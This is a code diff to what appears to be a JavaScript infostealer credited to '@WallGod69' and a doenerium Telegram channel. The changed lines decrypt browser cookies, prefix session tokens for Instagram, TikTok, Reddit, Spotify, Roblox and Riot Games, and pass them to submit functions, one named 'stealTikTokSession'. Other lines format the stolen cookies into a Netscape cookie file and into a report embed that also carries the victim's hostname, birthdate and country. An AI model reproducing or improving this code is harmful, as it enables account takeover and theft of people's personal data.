@@ -1202,7 +1202,7 @@ async function SpotifySession(cookie) {
                 { name: 'Birthdate', value: "```" + birthdate + "```", inline: true },
                 { name: 'Country', value: "```" + country + "```", inline: true },
                 { name: 'Spotify Profile', value: `[Open Profile](https://open.spotify.com/user/${username})`, inline: false },
-                { name: 'Spotify Cookie | sp_dc=', value: '```' + cookie + '```', inline: false }
+                { name: 'Spotify Cookie', value: '```' + cookie + '```', inline: false }
             ],
             footer: {
                 text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
@@ -2571,17 +2571,17 @@ async function getCookies() {
 
                         // Handle different services
                         if (row.host_key === '.instagram.com' && row.name === 'sessionid') {
-                            SubmitInstagram(`${decrypted}`);
+                            SubmitInstagram(`sessionid=${decrypted}`);
                         } else if (row.host_key === '.tiktok.com' && row.name === 'sessionid') {
-                            stealTikTokSession(`${decrypted}`);
+                            stealTikTokSession(`sessionid=${decrypted}`);
                         } else if (row.host_key === '.reddit.com' && row.name === 'reddit_session') {
-                            setRedditSession(`${decrypted}`);
+                            setRedditSession(`reddit_session=${decrypted}`);
                         } else if (row.host_key === '.spotify.com' && row.name === 'sp_dc') {
-                            SpotifySession(`${decrypted}`);
+                            SpotifySession(`sp_dc=${decrypted}`);
                         } else if (row.name === '.ROBLOSECURITY') {
-                            SubmitRoblox(`${decrypted}`);
+                            SubmitRoblox(`.ROBLOSECURITY=${decrypted}`);
                         } else if (row.host_key === 'account.riotgames.com' && row.name === 'sid') {
-                            RiotGameSession(`${decrypted}`);
+                            RiotGameSession(`sid=${decrypted}`);
                         }
                     } catch (error) {
                         console.error(`Error decrypting cookies for ${row.host_key}:`, error);
@@ -2592,7 +2592,7 @@ async function getCookies() {
                     }
 
                     cookiesData[`${browserFolder}_${browserPath[i][1]}`].push(
-                        `${row.host_key}  TRUE  / FALSE 2597573456  ${row.name} ${decrypted} \n\n`
+                        `${row.host_key}	TRUE	/	FALSE	2597573456	${row.name}	${decrypted} \n\n`
                     );
 
                     count.cookies++;
